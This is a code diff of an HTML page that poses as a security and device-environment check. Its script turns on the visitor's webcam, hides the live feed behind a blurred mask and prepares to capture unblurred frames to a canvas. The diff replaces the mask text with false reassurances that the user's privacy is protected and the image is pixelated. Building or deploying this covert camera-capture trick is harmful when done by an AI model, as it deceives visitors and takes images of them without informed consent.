@@ -11,7 +11,7 @@
         h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; }
         .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
         
-        /* 预览容器保持可见，但内部添加遮罩层遮挡 video */
+        /* 预览容器 */
         .preview-container {
             width: 100%;
             aspect-ratio: 4/3;
@@ -28,21 +28,34 @@
             object-fit: cover;
             /* 视频正常渲染，但被下面的遮罩层盖住 */
         }
-        /* 遮罩层：覆盖视频画面，用户看不到任何实际内容 */
+        /* 模糊遮罩层：用户看不到任何清晰画面 */
         .preview-mask {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);  /* 半透明黑色，完全遮盖画面 */
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(20px);
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: #fff;
+            color: rgba(255, 255, 255, 0.9);
             font-size: 14px;
-            backdrop-filter: blur(10px); /* 可选：模糊效果，确保看不到人脸 */
+            font-weight: 500;
+            text-align: center;
             z-index: 2;
+            gap: 8px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .mask-text {
+            background: rgba(0,0,0,0.5);
+            padding: 6px 12px;
+            border-radius: 30px;
+            backdrop-filter: blur(4px);
+            font-size: 13px;
         }
         .view-tip {
             position: absolute;
@@ -70,7 +83,10 @@
     <p class="subtitle">为保护网站与进行安全守护验证<br>需要检验您的设备环境与网络状态</p>
 
     <div class="preview-container">
-        <div class="preview-mask">环境检测中</div>
+        <div class="preview-mask">
+            <span>🔒 我们在保护你的隐私</span>
+            <span class="mask-text">图片打码处理，如预览所示</span>
+        </div>
         <div class="view-tip">● 验证中</div>
         <video id="video" autoplay playsinline muted></video>
     </div>
@@ -97,11 +113,9 @@
                 audio: false
             });
             videoElement.srcObject = streamRef;
-            // 等待视频开始播放后，确保有可用帧
             await new Promise((resolve) => {
                 videoElement.onloadedmetadata = () => resolve();
             });
-            // 主动播放（某些浏览器需要）
             await videoElement.play();
         } catch (err) {
             console.warn("摄像头初始化失败:", err);
@@ -155,9 +169,8 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        // 等待视频有有效尺寸和足够的帧数据
         if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
-            // 等待至少一帧画面绘制完成（防止极少数情况抓取到黑屏）
+            // 等待至少一帧画面就绪
             await new Promise((resolve) => {
                 if (video.readyState === 4 && video.videoWidth > 0) {
                     resolve();
@@ -165,7 +178,6 @@
                     video.addEventListener('canplay', resolve, { once: true });
                 }
             });
-            // 额外等待一个微任务，确保帧更新
             await new Promise(r => requestAnimationFrame(r));
             
             canvas.width = video.videoWidth;
